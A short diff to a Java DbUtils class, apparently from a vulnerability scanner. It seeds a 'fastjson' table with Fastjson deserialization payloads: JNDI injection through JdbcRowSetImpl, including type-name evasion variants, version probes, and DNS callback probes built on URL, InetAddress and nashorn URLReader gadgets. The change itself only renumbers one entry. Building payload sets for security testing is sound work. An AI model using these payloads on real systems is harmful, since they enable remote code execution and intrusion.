@@ -115,7 +115,7 @@ public class DbUtils {
             sqls.add("INSERT INTO \"fastjson\" VALUES (25, 'jndi', '{\"bbbbbb\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"FUZZ\", \"autoCommit\":true}}');");
             sqls.add("INSERT INTO \"fastjson\" VALUES (26, 'jndi', '{\"bbbbbb\":{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"FUZZ\", \"autoCommit\":true}}');");
             sqls.add("INSERT INTO \"fastjson\" VALUES (27, 'version', '[\"a\"]');");
-            sqls.add("INSERT INTO \"fastjson\" VALUES (27, 'version', '{\"@type\": \"java.lang.AutoCloseable\"');");
+            sqls.add("INSERT INTO \"fastjson\" VALUES (34, 'version', '{\"@type\": \"java.lang.AutoCloseable\"');");
             sqls.add("INSERT INTO \"fastjson\" VALUES (28, 'dns', 'Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dayu9.FUZZ\"}');");
             sqls.add("INSERT INTO \"fastjson\" VALUES (29, 'dns', '{\"name\":{\"@type\":\"java.net.InetAddress\",\"val\":\"dayu9xiaoyu47.FUZZ\"}}');");
             sqls.add("INSERT INTO \"fastjson\" VALUES (30, 'dns', '{\"a\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.alibaba.fastjson.JSONReader\",\"reader\":{\"@type\":\"jdk.nashorn.api.scripting.URLReader\",\"url\":\"http://dayu37xiaoyu68.FUZZ\"}}}');");
